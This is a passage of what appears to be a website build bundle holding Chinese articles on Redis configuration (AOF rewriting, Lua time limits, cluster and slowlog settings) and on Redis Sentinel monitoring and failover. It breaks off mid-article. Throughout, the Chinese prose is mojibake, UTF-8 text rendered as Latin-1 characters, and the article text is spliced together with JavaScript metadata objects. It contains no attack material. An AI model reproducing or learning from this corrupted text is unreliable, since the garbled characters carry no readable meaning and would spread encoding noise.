åºä¸ä¸ªå­è¿ç¨ï¼åå»ºä¸ä¸ªä¸´æ¶æä»¶ï¼éåæ°æ®åºï¼å°æ¯ä¸ª keyãvalue å¯¹è¾åºå°ä¸´æ¶æä»¶ãè¾åºæ ¼å¼å°±æ¯ redis çå½ä»¤ï¼ä½æ¯ä¸ºäºåå°æä»¶å¤§å°ï¼ä¼å°å¤ä¸ª keyãvalue å¯¹éåæ´çç¨ä¸æ¡å½ä»¤è¡¨è¾¾ãå¨ rewrite æé´çåæä½ä¼ä¿å­å¨åå­ç rewrite buffer ä¸­ï¼rewrite æååè¿äºæä½ä¹ä¼å¤å¶å°ä¸´æ¶æä»¶ä¸­ï¼å¨æåä¸´æ¶æä»¶ä¼ä»£æ¿ aof æä»¶ã\n\nç®åæ¥è¯´ï¼aof éå­æ¾äºææç redis æä½æä»¤ï¼å½ aof æä»¶è¾¾å°ä¸å®æ¡ä»¶æèæå¨ bgrewriteaof å½ä»¤é½å¯ä»¥è§¦å rewriteãrewrite ä¹å aof æä»¶ä¼ä¿å­ keys çæåçç¶æï¼æ¸é¤æä¹ååä½çï¼æ¥ç¼©å°è¿ä¸ªæä»¶ãè¿éæè°çç¼©å°å°±æ¯ æ´çæä»¤ ï¼æ¯å¦å®¢æ·ç«¯åéè¿ä¸ä¸ªå½ä»¤ï¼\n\nlpush key 1 2 3\n# ç§»åºå·¦è¾¹ç¬¬ä¸ä¸ªåç´ ï¼ä¹å°±æ¯æä¸é¢çåç´  1 ç§»åº\nlpop key \nlpush key 4 5 6\n\n\n1\n2\n3\n4\n\n\næ´çåçæä»¤æä»¶æ¯\n\nlpush key 4 5 6 2 3\n\n\n1\n\n\n\n# aof-load-truncated\n\naof-load-truncated yes\n\n\n1\n\n\næ redis å¨æ¢å¤æ¶ï¼ä¼å¿½ç¥æåä¸æ¡å¯è½å­å¨é®é¢çæä»¤ãé»è®¤å¼ yesãå³å¨ aof åå¥æ¶ï¼å¯è½å­å¨æä»¤åéçé®é¢ (çªç¶æ­çµï¼åäºä¸å)ï¼è¿ç§æåµä¸ï¼yes ä¼ log å¹¶ç»§ç»­ï¼è no ä¼ç´æ¥æ¢å¤å¤±è´¥.\n\n\n# aof-use-rdb-preamble\n\naof-use-rdb-preamble yes\n\n\n1\n\n\næ··åæä¹ååæ ·ä¹æ¯éè¿ bgrewriteaof å®æçï¼ä¸åçæ¯å½å¼å¯æ··åæä¹åæ¶ï¼fork åºçå­è¿ç¨åå°å±äº«çåå­å¯æ¬å¨éçä»¥ rdb æ¹å¼åå¥ aof æä»¶ï¼ç¶åå¨å°éåç¼å²åºçå¢éå½ä»¤ä»¥ aof æ¹å¼åå¥å°æä»¶ï¼åå¥å®æåéç¥ä¸»è¿ç¨æ´æ°ç»è®¡ä¿¡æ¯ï¼å¹¶å°æ°çå«æ rdb æ ¼å¼å aof æ ¼å¼ç aof æä»¶æ¿æ¢æ§çç aof æä»¶ãç®åçè¯´ï¼æ°ç aof æä»¶ååæ®µæ¯ rdb æ ¼å¼çå¨éæ°æ®ååæ®µæ¯ aof æ ¼å¼çå¢éæ°æ®ã\n\n\n# lua scripting lua èæ¬\n\nredis æä¾äº lua èæ¬åè½æ¥è®©ç¨æ·å®ç°èªå·±çåå­å½ä»¤ï¼ä½ä¹å­å¨çé£é©ï¼ç¼åä¸å½çèæ¬å¯è½é»å¡çº¿ç¨å¯¼è´æ´ä¸ª redis æå¡ä¸å¯ç¨ã\n\nlua-time-limit 5000\n\n\n1\n\n\nredis çéç½®æä»¶ä¸­æä¾äºå¦ä¸éç½®é¡¹æ¥è§å®æå¤§æ§è¡æ¶é¿ã\n\nä½è¿éæä¸ªåï¼å½ä¸ä¸ªèæ¬è¾¾å°æå¤§æ§è¡æ¶é¿çæ¶åï¼redis å¹¶ä¸ä¼å¼ºå¶åæ­¢èæ¬çè¿è¡ï¼ä»ä»å¨æ¥å¿éæå°ä¸ªè­¦åï¼åç¥æèæ¬è¶æ¶ã\n\nå ä¸º redis å¿é¡»ä¿è¯èæ¬æ§è¡çåå­æ§ï¼ä¸­éåæ­¢å¯è½å¯¼è´åå­çæ°æ®éä¸åªä¿®æ¹äºé¨åæ°æ®ã\n\nå¦ææ¶é¿è¾¾å° lua-time-limit è§å®çæå¤§æ§è¡æ¶é´ï¼redis åªä¼åè¿å ä»¶äºæï¼\n\n * æ¥å¿è®°å½æèæ¬è¿è¡è¶æ¶\n * å¼å§åè®¸æ¥åå¶ä»å®¢æ·ç«¯è¯·æ±ï¼ä½ä»éäº script kill å shutdown nosave ä¸¤ä¸ªå½ä»¤\n * å¶ä»è¯·æ±ä»è¿å busy éè¯¯\n\n\n# - cluster éç¾¤\n\ncluster-enabled yes\n\n\n1\n\n\nå¼å¯éç¾¤æ¨¡å¼\n\ncluster-config-file nodes-6379.conf\n\n\n1\n\n\n1ãè¿ä¸ªéç½®æä»¶ä¸æ¯è¦æä»¬å»éçï¼èæ¯ redis è¿è¡æ¶ä¿å­éç½®çæä»¶ï¼æä»¥æä»¬ä¹ä¸å¯ä»¥ä¿®æ¹è¿ä¸ªæä»¶ã\n\n2ãredis éç¾¤èç¹æ¯æ¬¡åçæ´æ¹æ¶èªå¨ä¿çéç¾¤éç½®ï¼åºæ¬ä¸ä¸ºç¶æï¼çæä»¶ï¼ä»¥ä¾¿è½å¤ å¨å¯å¨æ¶éæ°è¯»åå®ã\n\n3ãè¯¥æä»¶ååºäºéç¾¤ä¸­å¶ä»èç¹ï¼å®ä»¬çç¶æï¼æä¹åéç­ç­ä¿¡æ¯ã ç±äºæäºæ¶æ¯çæ¥æ¶ï¼éå¸¸ä¼å°æ­¤æä»¶éåå¹¶å·æ°å°ç£çä¸ã\n\n4ãçæçæä»¶å¨ dir æå®è·¯å¾ä¸\n\ncluster-node-timeout 15000\n\n\n1\n\n\nè¶æ¶æ¶é´æ¯éç¾¤ä¸­åèç¹ç¸äºéè®¯æ¶ï¼åè®¸ "å¤±è" çæå¤§æ¯«ç§æ°ï¼ä¸é¢çéç½®ä¸º 15 ç§ï¼å¦æè¶è¿ 15 ç§æä¸ªèç¹æ²¡åå¶å®èç¹æ±æ¥æåï¼è®¤ä¸ºè¯¥èç¹æäºã\n\ncluster-replica-validity-factor 10\n\n\n1\n\n\n1ãå¦æè®¾ç½®ä¸º 0ï¼æ è®ºä¸»èç¹åä»èç¹ä¹é´çé¾è·¯æ­å¼è¿æ¥çæ¶é´é¿ç­ï¼ä»èç¹é½å°å°è¯æéåæ¢ä¸ºä¸»èç¹ã\n\n2ã å¦æè¯¥å¼ä¸ºæ­£å¼ï¼åè®¡ç®æå¤§æ­å¼æ¶é´ä½ä¸ºèç¹è¶æ¶å¼ä¹ä»¥æ­¤éé¡¹æä¾çç³»æ°ï¼å¦æè¯¥èç¹æ¯ä»èç¹ï¼åå¨ä¸»é¾è·¯æ­å¼è¿æ¥çæ¶é´è¶è¿æå®çè¶æ¶å¼æ¶ï¼å®ä¸ä¼å°è¯å¯å¨æéåæ¢ã ä¾å¦ï¼å¦æèç¹è¶æ¶è®¾ç½®ä¸º 5 ç§ï¼å¹¶ä¸ææå å­è®¾ç½®ä¸º 10ï¼åä¸ä¸»èç¹æ­å¼è¿æ¥è¶è¿ 50 ç§çä»èç¹å°ä¸ä¼å°è¯å¯¹å¶ä¸»èç¹è¿è¡æéåæ¢ã\n\n3ãè¯·æ³¨æï¼å¦ææ²¡æä»æå¡å¨èç¹è½å¤å¯¹å¶è¿è¡æéè½¬ç§»ï¼åä»»ä½éé¶å¼é½å¯è½å¯¼è´ redis éç¾¤å¨ä¸»æå¡å¨åºç°æéåä¸å¯ç¨ã å¨è¿ç§æåµä¸ï¼åªæåå§ä¸»èç¹éæ°å å¥éç¾¤æ¶ï¼éç¾¤æä¼è¿åå¯ç¨ã\n\ncluster-migration-barrier 1\n\n\n1\n\n\nä¸»èç¹å°ä¿æè¿æ¥çæå°ä»èç¹æ°éï¼ä»¥ä¾¿å¦ä¸ä¸ªä»èç¹è¿ç§»å°ä¸åä»»ä½ä»èç¹è¦ççä¸»èç¹ã\n\ncluster-require-full-coverage yes\n\n\n1\n\n\nå½ cluster-require-full-coverage ä¸º no æ¶ï¼è¡¨ç¤ºå½è´è´£ä¸ä¸ªææ§½çä¸»åºä¸çº¿ä¸æ²¡æç¸åºçä»åºè¿è¡æéæ¢å¤æ¶ï¼éç¾¤ä»ç¶å¯ç¨ã\n\nå½ cluster-require-full-coverage ä¸º yes æ¶ï¼è¡¨ç¤ºå½è´è´£ä¸ä¸ªææ§½çä¸»åºä¸çº¿ä¸æ²¡æç¸åºçä»åºè¿è¡æéæ¢å¤æ¶ï¼éç¾¤ä¸å¯ç¨ã\n\ncluster-replica-no-failover no\n\n\n1\n\n\nè®¾ç½®ä¸º yes æ¶ï¼æ­¤éé¡¹å¯é²æ­¢ä»æå¡å¨å¨ä¸»æå¡å¨æéæé´å°è¯å¯¹ä¸»æå¡å¨è¿è¡æéè½¬ç§»ãä½æ¯ï¼ä¸»æå¡å¨ä»ç¶å¯ä»¥æ§è¡æå¨æéè½¬ç§»ï¼å¦æè¢«è¿«æ§è¡ï¼ã\n\ncluster-allow-reads-when-down no\n\n\n1\n\n\né»è®¤ä¸º no, è¡¨ç¤ºå½éç¾¤å ä¸»èç¹æ°éè¾¾ä¸å°æå°å¼æææ£åæ§½æ²¡æåéèè¢«æ è®°ä¸ºå¤±ææ¶ï¼èç¹å°åæ­¢ææçå®¢æ·ç«¯éè®¯ã è¿æ ·å¯ä»¥é¿åä»ä¸ä¸ªä¸ç¥ééç¾¤ç¶æååçèç¹è¯»å°ä¸ä¸è´æ°æ®çå±é©ã è®¾ä¸º yes ååè®¸éç¾¤å¤±ææ¶ä»å¯ä»¥ç±èç¹ä¸­è¯»åæ°æ®ã è¿æ ·æ¢ä¿è¯è¯»æä½çé«å¯ç¨æ§ï¼ ä¹é¿åä¸ä¸è´åæä½ï¼åæ¶å½ redis cluster ä»åå« 1 è³ 2 ä¸ªèç¹ï¼èæä¸ªèç¹å¤±æåæ å¯ç¨ä»èç¹æ¿ä»£ï¼ä¸å èç¹æ°éä¸è¶³ï¼æ æ³èªå¨éæ°åéæ£åæ§½ï¼åè¯¥åæ°è®¾ä¸º yes å¯ä¿è¯èç¹ä»ç¶å¯æ§è¡è¯»æä½ã\n\n\n# slow log æ¢æ¥å¿\n\nslowlog-log-slower-than 1000\n\n\n1\n\n\nå¶ä¸­ slowlog-log-slower-than è¡¨ç¤º slowlog çåå®çéï¼åªæ query æ§è¡æ¶é´å¤§äº slowlog-log-slower-than çæä¼å®ä¹ææ¢æ¥è¯¢ï¼æä¼è¢« slowlog è¿è¡è®°å½ãslowlog-log-slower-than è®¾ç½®çåä½æ¯å¾®å¦ï¼é»è®¤æ¯ 10000 å¾®å¦ï¼ä¹å°±æ¯ 10ms\n\nslowlog-max-len 128\n\n\n1\n\n\nslowlog-max-len è¡¨ç¤ºæ¢æ¥è¯¢æå¤§çæ¡æ°ï¼å½ slowlog è¶è¿è®¾å®çæå¤§å¼åï¼ä¼å°ææ©ç slowlog å é¤ï¼æ¯ä¸ª fifo éå\n\n\n# latency monitor å»¶è¿çè§å¨\n\nlatency-monitor-threshold 0\n\n\n1\n\n\nredis å»¶æ¶çæ§ç³»ç»å¨è¿è¡æ¶ä¼éæ ·ä¸äºæä½ï¼ä»¥ä¾¿æ¶éå¯è½å¯¼è´å»¶æ¶çæ°æ®æ ¹æºã\néè¿ latency å½ä»¤ å¯ä»¥æå°ä¸äºå¾æ ·åè·åä¸äºæ¥åï¼æ¹ä¾¿çæ§\nè¿ä¸ªç³»ç»ä»ä»è®°å½é£ä¸ªæ§è¡æ¶é´å¤§äºæç­äºé¢å®æ¶é´ï¼æ¯«ç§ï¼çæä½ï¼\nè¿ä¸ªé¢å®æ¶é´æ¯éè¿ latency-monitor-threshold éç½®æ¥æå®çï¼\nå½è®¾ç½®ä¸º 0 æ¶ï¼è¿ä¸ªçæ§ç³»ç»å¤äºåæ­¢ç¶æ\n\n\n# event notification äºä»¶éç¥\n\nnotify-keyspace-events ""\n\n\n1\n\n\n\n# advanced config é«çº§éç½®\n\nå½åå¸æ¡ç®åªæå°éæ¡ç®ä¸æå¤§æ¡ç®æªè¶è¿ç»å®éå¼æ¶ï¼å°ä½¿ç¨åå­é«æçæ°æ®ç»æå¯¹å¶è¿è¡ç¼ç \n\nhash-max-ziplist-entries 512\n\n\n1\n\n\næ°æ®éå°äºç­äº hash-max-ziplist-entries çç¨ ziplistï¼å¤§äº hash-max-ziplist-entries ç¨ hash\n\nhash-max-ziplist-value 64\n\n\n1\n\n\nvalue å¤§å°å°äºç­äº hash-max-ziplist-value çç¨ ziplistï¼å¤§äº hash-max-ziplist-value ç¨ hashã',charsets:{cjk:!0}},{title:"Redisé«å¯ç¨(äº) å¨åµçè®º",frontmatter:{title:"Redisé«å¯ç¨(äº) å¨åµçè®º",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1608",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1608.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%BA%8C)%20%E5%93%A8%E5%85%B5%E7%90%86%E8%AE%BA.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1608.Redisé«å¯ç¨(äº) å¨åµçè®º.md",key:"v-146c1cb3",path:"/Redis/1608/",headers:[{level:2,title:"ç®ä»",slug:"ç®ä»",normalizedTitle:"ç®ä»",charIndex:2},{level:2,title:"æ¯ä¸ª Sentinel é½éè¦å®ææ§è¡çä»»å¡",slug:"æ¯ä¸ª-sentinel-é½éè¦å®ææ§è¡çä»»å¡",normalizedTitle:"æ¯ä¸ª sentinel é½éè¦å®ææ§è¡çä»»å¡",charIndex:776},{level:2,title:"èªå¨åç° Sentinel åä»æå¡å¨",slug:"èªå¨åç°-sentinel-åä»æå¡å¨",normalizedTitle:"èªå¨åç° sentinel åä»æå¡å¨",charIndex:1479},{level:2,title:"æéè½¬ç§»",slug:"æéè½¬ç§»",normalizedTitle:"æéè½¬ç§»",charIndex:716},{level:2,title:"Sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨",slug:"sentinel-èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨",normalizedTitle:"sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨",charIndex:3371},{level:2,title:"Sentinel ç¶æçæä¹å",slug:"sentinel-ç¶æçæä¹å",normalizedTitle:"sentinel ç¶æçæä¹å",charIndex:4032},{level:2,title:"Sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®",slug:"sentinel-å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®",normalizedTitle:"sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®",charIndex:4205},{level:2,title:"TILT æ¨¡å¼",slug:"tilt-æ¨¡å¼",normalizedTitle:"tilt æ¨¡å¼",charIndex:4560},{level:2,title:"Sentinel å½ä»¤",slug:"sentinel-å½ä»¤",normalizedTitle:"sentinel å½ä»¤",charIndex:5287}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ç®ä» æ¯ä¸ª Sentinel é½éè¦å®ææ§è¡çä»»å¡ èªå¨åç° Sentinel åä»æå¡å¨ æéè½¬ç§» Sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨ Sentinel ç¶æçæä¹å Sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½® TILT æ¨¡å¼ Sentinel å½ä»¤",content:"# ç®ä»\n\nRedis ç Sentinel ç³»ç»ç¨äºç®¡çå¤ä¸ª Redis æå¡å¨ï¼ è¯¥ç³»ç»æ§è¡ä»¥ä¸ä¸ä¸ªä»»å¡ï¼\n\n * çæ§ï¼Monitoringï¼ï¼ Sentinel ä¼ä¸æ­å°æ£æ¥ä½ ç master å slave æ¯å¦è¿ä½æ­£å¸¸ã\n * æéï¼Notificationï¼ï¼ å½è¢«çæ§çæä¸ª Redis æå¡å¨åºç°é®é¢æ¶ï¼ Sentinel å¯ä»¥éè¿ API åç®¡çåæèå¶ä»åºç¨ç¨åºåééç¥ã\n * èªå¨æéè¿ç§»ï¼Automatic failoverï¼ï¼ å½ä¸ä¸ª master ä¸è½æ­£å¸¸å·¥ä½æ¶ï¼ Sentinel ä¼å¼å§ä¸æ¬¡èªå¨æéè¿ç§»æä½ï¼ å®ä¼å°å¤±æ master çå¶ä¸­ä¸ä¸ª slave åçº§ä¸ºæ°ç masterï¼ å¹¶è®©å¤±æ master çå¶ä» slave æ¹ä¸ºå¤å¶æ°ç masterï¼ å½å®¢æ·ç«¯è¯å¾è¿æ¥å¤±æç master æ¶ï¼ éç¾¤ä¹ä¼åå®¢æ·ç«¯è¿åæ° master çå°åï¼ ä½¿å¾éç¾¤å¯ä»¥ä½¿ç¨æ° master ä»£æ¿å¤±ææå¡å¨ã\n\n\n\nå¨é»è®¤æåµä¸ï¼ Sentinel ä½¿ç¨ TCP ç«¯å£ 26379 ï¼æ®é Redis æå¡å¨ä½¿ç¨çæ¯ 6379 ï¼ã\n\nSentinel æ¥å Redis åè®®æ ¼å¼çå½ä»¤è¯·æ±ï¼ æä»¥ä½ å¯ä»¥ä½¿ç¨ redis-cli æèä»»ä½å¶ä» Redis å®¢æ·ç«¯æ¥ä¸ Sentinel è¿è¡éè®¯ã\n\næä¸¤ç§æ¹å¼å¯ä»¥å Sentinel è¿è¡éè®¯ï¼\n\n * ç¬¬ä¸ç§æ¹æ³æ¯éè¿ç´æ¥åéå½ä»¤æ¥æ¥è¯¢è¢«çè§ Redis æå¡å¨çå½åç¶æï¼ ä»¥å Sentinel æç¥éçå³äºå¶ä» Sentinel çä¿¡æ¯ï¼ è¯¸å¦æ­¤ç±»ã\n * å¦ä¸ç§æ¹æ³æ¯ä½¿ç¨åå¸ä¸è®¢éåè½ï¼ éè¿æ¥æ¶ Sentinel åéçéç¥ï¼ å½æ§è¡æéè½¬ç§»æä½ï¼ æèæä¸ªè¢«çè§çæå¡å¨è¢«å¤æ­ä¸ºä¸»è§ä¸çº¿æèå®¢è§ä¸çº¿æ¶ï¼ Sentinel å°±ä¼åéç¸åºçä¿¡æ¯ã\n\n\n# æ¯ä¸ª Sentinel é½éè¦å®ææ§è¡çä»»å¡\n\næ¯ä¸ª Sentinel ä»¥æ¯ç§éä¸æ¬¡çé¢çåå®æç¥ç master ãslave ä»¥åå¶ä» Sentinel å®ä¾åéä¸ä¸ª PING å½ä»¤ã\n\nå¦æä¸ä¸ªå®ä¾ï¼instanceï¼è·ç¦»æåä¸æ¬¡ææåå¤ PING å½ä»¤çæ¶é´è¶è¿ down-after-milliseconds éé¡¹ææå®çå¼ï¼ é£ä¹è¿ä¸ªå®ä¾ä¼è¢« Sentinel æ è®°ä¸ºä¸»è§ä¸çº¿ã ä¸ä¸ªææåå¤å¯ä»¥æ¯ï¼ +PONG ã -LOADING æè -MASTERDOWN ã\n\nå¦æä¸ä¸ª master è¢«æ è®°ä¸ºä¸»è§ä¸çº¿ï¼ é£ä¹æ­£å¨çè§è¿ä¸ª master çææ Sentinel è¦ä»¥æ¯ç§ä¸æ¬¡çé¢çç¡®è®¤ master çç¡®è¿å¥äºä¸»è§ä¸çº¿ç¶æã\n\nå¦æä¸ä¸ª master è¢«æ è®°ä¸ºä¸»è§ä¸çº¿ï¼ å¹¶ä¸æè¶³å¤æ°éç Sentinel ï¼è³å°è¦è¾¾å°éç½®æä»¶æå®çæ°éï¼å¨æå®çæ¶é´èå´ååæè¿ä¸å¤æ­ï¼ é£ä¹è¿ä¸ª master è¢«æ è®°ä¸ºå®¢è§ä¸çº¿ã\n\nå¨ä¸è¬æåµä¸ï¼ æ¯ä¸ª Sentinel ä¼ä»¥æ¯ 10 ç§ä¸æ¬¡çé¢çåå®å·²ç¥çææ master å slave åé INFO å½ä»¤ã å½ä¸ä¸ª master è¢« Sentinel æ è®°ä¸ºå®¢è§ä¸çº¿æ¶ï¼ Sentinel åä¸çº¿ master çææ slave åé INFO å½ä»¤çé¢çä¼ä» 10 ç§ä¸æ¬¡æ¹ä¸ºæ¯ç§ä¸æ¬¡ã\n\nå½æ²¡æè¶³å¤æ°éç Sentinel åæ master å·²ç»ä¸çº¿ï¼ master çå®¢è§ä¸çº¿ç¶æå°±ä¼è¢«ç§»é¤ã å½ master éæ°å Sentinel ç PING å½ä»¤è¿åææåå¤æ¶ï¼ master çä¸»è§ä¸çº¿ç¶æå°±ä¼è¢«ç§»é¤ã\n\n\n# èªå¨åç° Sentinel åä»æå¡å¨\n\nä¸ä¸ª Sentinel å¯ä»¥ä¸å¶ä»å¤ä¸ª Sentinel è¿è¡è¿æ¥ï¼ åä¸ª Sentinel ä¹é´å¯ä»¥äºç¸æ£æ¥å¯¹æ¹çå¯ç¨æ§ï¼ å¹¶è¿è¡ä¿¡æ¯äº¤æ¢ã\n\nä½ æ é¡»ä¸ºè¿è¡çæ¯ä¸ª Sentinel åå«è®¾ç½®å¶ä» Sentinel çå°åï¼ å ä¸º Sentinel å¯ä»¥éè¿åå¸ä¸è®¢éåè½æ¥èªå¨åç°æ­£å¨çè§ç¸å master çå¶ä» Sentinel ï¼ è¿ä¸åè½æ¯éè¿åé¢é sentinel:hello åéä¿¡æ¯æ¥å®ç°çã\n\nä¸æ­¤ç±»ä¼¼ï¼ ä½ ä¹ä¸å¿æå¨ååº master å±ä¸çææ slave ï¼ å ä¸º Sentinel å¯ä»¥éè¿è¯¢é® master æ¥è·å¾ææ slave çä¿¡æ¯ã\n\næ¯ä¸ª Sentinel ä¼ä»¥æ¯ä¸¤ç§ä¸æ¬¡çé¢çï¼ éè¿åå¸ä¸è®¢éåè½ï¼ åè¢«å®çè§çææ master å slave ç sentinel:hello é¢éåéä¸æ¡ä¿¡æ¯ï¼ ä¿¡æ¯ä¸­åå«äº Sentinel ç IP å°åãç«¯å£å·åè¿è¡ ID ï¼runidï¼ã\n\næ¯ä¸ª Sentinel é½è®¢éäºè¢«å®çè§çææ master å slave ç sentinel:hello é¢éï¼ æ¥æ¾ä¹åæªåºç°è¿ç sentinel ï¼looking for unknown sentinelsï¼ã å½ä¸ä¸ª Sentinel åç°ä¸ä¸ªæ°ç Sentinel æ¶ï¼ å®ä¼å°æ°ç Sentinel æ·»å å°ä¸ä¸ªåè¡¨ä¸­ï¼ è¿ä¸ªåè¡¨ä¿å­äº Sentinel å·²ç¥çï¼ çè§åä¸ä¸ª master çææå¶ä» Sentinel ã\n\nSentinel åéçä¿¡æ¯ä¸­è¿åæ¬å®æ´ç master å½åéç½®ï¼configurationï¼ã å¦æä¸ä¸ª Sentinel åå«ç master éç½®æ¯å¦ä¸ä¸ª Sentinel åéçéç½®è¦æ§ï¼ é£ä¹è¿ä¸ª Sentinel ä¼ç«å³åçº§å°æ°éç½®ä¸ã\n\nå¨å°ä¸ä¸ªæ° Sentinel æ·»å å°çè§ master çåè¡¨ä¸é¢ä¹åï¼ Sentinel ä¼åæ£æ¥åè¡¨ä¸­æ¯å¦å·²ç»åå«äºåè¦æ·»å ç Sentinel æ¥æç¸åè¿è¡ ID æèç¸åå°åï¼åæ¬ IP å°ååç«¯å£å·ï¼ç Sentinel ï¼ å¦ææ¯çè¯ï¼ Sentinel ä¼åç§»é¤åè¡¨ä¸­å·²æçé£äºæ¥æç¸åè¿è¡ ID æèç¸åå°åç Sentinel ï¼ ç¶ååæ·»å æ° Sentinel ã\n\n\n# æéè½¬ç§»\n\nä¸æ¬¡æéè½¬ç§»æä½ç±ä»¥ä¸æ­¥éª¤ç»æï¼\n\n * åç° master å·²ç»è¿å¥å®¢è§ä¸çº¿ç¶æã\n * å¯¹æä»¬çå½å epoch å¼è¿è¡èªå¢ï¼ å¹¶å°è¯å¨è¿ä¸ª epoch å¼ä¸­å½éã\n * å¦æå½éå¤±è´¥ï¼ é£ä¹å¨è®¾å®çæéè¿ç§»è¶æ¶æ¶é´çä¸¤åä¹åï¼ éæ°å°è¯å½éã å¦æå½éæåï¼ é£ä¹æ§è¡ä»¥ä¸æ­¥éª¤ã\n * éåºä¸ä¸ª slaveï¼å¹¶å°å®åçº§ä¸º masterã\n * åè¢«éä¸­ç slave åéÂ  SLAVEOF NO ONE Â å½ä»¤ï¼è®©å®è½¬åä¸º masterã\n * éè¿åå¸ä¸è®¢éåè½ï¼ å°æ´æ°åçéç½®ä¼ æ­ç»ææå¶ä» Sentinel ï¼ å¶ä» Sentinel å¯¹å®ä»¬èªå·±çéç½®è¿è¡æ´æ°ã\n * åå·²ä¸çº¿ master ç slave åéÂ SLAVEOF å½ä»¤ï¼ è®©å®ä»¬å»å¤å¶æ°ç masterã\n * å½ææ slave é½å·²ç»å¼å§å¤å¶æ°ç master æ¶ï¼ é¢å¤´ Sentinel ç»æ­¢è¿æ¬¡æéè¿ç§»æä½ã\n\næ¯å½ä¸ä¸ª Redis å®ä¾è¢«éæ°éç½®ï¼reconfiguredï¼ ââ æ è®ºæ¯è¢«è®¾ç½®æ masterãslaveãåæèè¢«è®¾ç½®æå¶ä» master ç slave ââ Sentinel é½ä¼åè¢«éæ°éç½®çå®ä¾åéä¸ä¸ª CONFIG REWRITE å½ä»¤ï¼ ä»èç¡®ä¿è¿äºéç½®ä¼æä¹åå¨ç¡¬çéã\n\nSentinel ä½¿ç¨ä»¥ä¸è§åæ¥éæ©æ°ç masterï¼\n\n * å¨å¤±æ master å±ä¸ç slave å½ä¸­ï¼ é£äºè¢«æ è®°ä¸ºä¸»è§ä¸çº¿ãå·²æ­çº¿ãæèæåä¸æ¬¡åå¤Â PINGÂ å½ä»¤çæ¶é´å¤§äºäºç§éç slave é½ä¼è¢«æ·æ±°ã\n * å¨å¤±æ master å±ä¸ç slave å½ä¸­ï¼ é£äºä¸å¤±æ master è¿æ¥æ­å¼çæ¶é¿è¶è¿ down-after éé¡¹æå®çæ¶é¿ååç slave é½ä¼è¢«æ·æ±°ã\n * å¨ç»åäºä»¥ä¸ä¸¤è½®æ·æ±°ä¹åå©ä¸æ¥ç slave ä¸­ï¼ æä»¬éåºå¤å¶åç§»éï¼replication offsetï¼æå¤§çé£ä¸ª slave ä½ä¸ºæ°ç masterï¼ å¦æå¤å¶åç§»éä¸å¯ç¨ï¼ æè slave çå¤å¶åç§»éç¸åï¼ é£ä¹å¸¦ææå°è¿è¡ ID çé£ä¸ª slave æä¸ºæ°ç masterã\n\n\n# Sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨\n\nSentinel èªå¨æéè¿ç§»ä½¿ç¨ Raft ç®æ³æ¥éä¸¾ leaderï¼ç»é¿ï¼Sentinel ï¼ ä»èç¡®ä¿å¨ä¸ä¸ªç»å®ç epoch å¼éï¼ åªæä¸ä¸ª leader äº§çã\n\nè¿è¡¨ç¤ºå¨åä¸ä¸ª epoch å¼ä¸­ï¼ ä¸ä¼æä¸¤ä¸ª Sentinel åæ¶è¢«éä¸­ä¸º leaderï¼ å¹¶ä¸åä¸ª Sentinel å¨åä¸ä¸ª epoch å¼ä¸­åªä¼å¯¹ä¸ä¸ª leader è¿è¡æç¥¨ã\n\næ´é«çéç½® epoch å¼æ»æ¯ä¼äºè¾ä½ç epoch å¼ï¼ å æ­¤æ¯ä¸ª Sentinel é½ä¼ä¸»å¨ä½¿ç¨æ´æ°ç epoch å¼æ¥ä»£æ¿èªå·±çéç½®ã\n\nç®åæ¥è¯´ï¼ æä»¬å¯ä»¥å° Sentinel éç½®çä½æ¯ä¸ä¸ªå¸¦æçæ¬å·çç¶æã ä¸ä¸ªç¶æä¼ä»¥æååå¥èèåºï¼last-write-winsï¼çæ¹å¼ï¼ä¹å³æ¯ï¼ææ°çéç½®æ»æ¯èåºï¼ä¼ æ­è³ææå¶ä» Sentinel ã\n\nä¸¾ä¸ªä¾å­ï¼ å½åºç°ç½ç»åå²ï¼network partitionsï¼æ¶ï¼ ä¸ä¸ª Sentinel å¯è½ä¼åå«äºè¾æ§çéç½®ï¼ èå½è¿ä¸ª Sentinel æ¥å°å¶ä» Sentinel åæ¥ççæ¬æ´æ°çéç½®æ¶ï¼ Sentinel å°±ä¼å¯¹èªå·±çéç½®è¿è¡æ´æ°ã\n\nå¦æè¦å¨ç½ç»åå²åºç°çæåµä¸ä»ç¶ä¿æä¸è´æ§ï¼ é£ä¹åºè¯¥ä½¿ç¨ min-slaves-to-write éé¡¹ï¼ è®© master å¨è¿æ¥çä»å®ä¾å°äºç»å®æ°éæ¶åæ­¢æ§è¡åæä½ï¼ ä¸æ­¤åæ¶ï¼ åºè¯¥å¨æ¯ä¸ªè¿è¡ Redis master æ slave çæºå¨ä¸è¿è¡ Redis Sentinel è¿ç¨ã\n\n\n# Sentinel ç¶æçæä¹å\n\nSentinel çç¶æä¼è¢«æä¹åå¨ Sentinel éç½®æä»¶éé¢ã\n\næ¯å½ Sentinel æ¥æ¶å°ä¸ä¸ªæ°çéç½®ï¼ æèå½ç»é¿ Sentinel ä¸º master åå»ºä¸ä¸ªæ°çéç½®æ¶ï¼ è¿ä¸ªéç½®ä¼ä¸éç½® epoch å¼ä¸èµ·è¢«ä¿å­å°ç£çéé¢ã\n\nè¿æå³çåæ­¢åéå¯ Sentinel è¿ç¨é½æ¯å®å¨çã\n\n\n# Sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®\n\nå³ä½¿æ²¡æèªå¨æéè¿ç§»æä½å¨è¿è¡ï¼ Sentinel æ»ä¼å°è¯å°å½åçé